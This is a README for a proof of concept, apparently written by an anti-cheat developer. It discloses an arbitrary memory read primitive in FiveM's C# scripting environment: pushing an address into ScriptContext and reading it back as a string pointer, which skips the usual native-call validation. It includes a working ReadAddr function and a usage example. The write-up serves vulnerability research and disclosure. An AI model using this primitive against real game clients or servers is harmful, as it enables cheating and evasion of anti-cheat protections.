# FiveM Arbitrary Memory Read PoC V2

Small proof-of-concept demonstrating an arbitrary memory read primitive in the FiveM C# scripting environment through direct use of `ScriptContext`.

## About

I'm a co-founder of **[FiveGuard](https://fiveguard.net)**, a FiveM anti-cheat project focused on improving security across the platform.

A lot of this research comes from looking into FiveM internals, runtime behavior, and security boundaries while working on FiveGuard. The goal is not only to improve our own anti-cheat, but also to help make the FiveM ecosystem more secure overall.

## How it works

Instead of using the normal FiveM native invocation path:

```csharp
Function.Call<T>()
```

the PoC interacts directly with:

```csharp
ScriptContext
```

The core idea is:

```csharp
ScriptContext.Reset();
ScriptContext.Push(address);

return ScriptContext.GetResult<string>();
```

A controlled address is pushed into the context and then interpreted by:

```csharp
ScriptContext.GetResult<string>()
```

as a string pointer.

In simplified form:

```text
memory address
    ↓
ScriptContext.Push(address)
    ↓
GetResult<string>()
    ↓
address interpreted as string pointer
    ↓
string returned to C#
```

No GTA native call is required.

## Example

```csharp
public static string ReadAddr(ulong address)
{
    try
    {
        ScriptContext.Reset();
        ScriptContext.Push(address);

        return ScriptContext.GetResult<string>();
    }
    catch
    {
        return null;
    }
}
```

Usage:

```csharp
string value = ReadAddr(0x28B82440000);
```

If the address points to a readable string, the string is returned normally.

## Invalid Addresses

Invalid memory addresses do not crash the FiveM process in this case.

`GetResult<string>()` throws an error which can be handled with a normal `try/catch`.

```text
valid address
    ↓
string returned

invalid address
    ↓
exception thrown
    ↓
caught by C#
```

## Why this is interesting

FiveM's normal higher-level native invocation API contains additional validation and sanitization around native calls and results.

This PoC bypasses that higher-level path entirely and directly manipulates the underlying `ScriptContext`.

The interesting part is not a specific GTA native, but the fact that a raw context value can be interpreted directly as a managed string pointer.

## Root Cause

```text
controlled ulong
    ↓
ScriptContext storage
    ↓
GetResult<string>()
    ↓
value interpreted as native string pointer
    ↓
arbitrary string memory read
```

This creates a straightforward arbitrary string memory read primitive from managed C#.

## Scope

Tested with:

```text
FiveM
C#
Mono runtime
ScriptContext
```

Behavior may differ between runtime versions.

## Disclaimer

This repository is provided for:

* security research
* FiveM runtime analysis
* educational purposes
* vulnerability documentation

Only test against environments you own or have explicit permission to research.
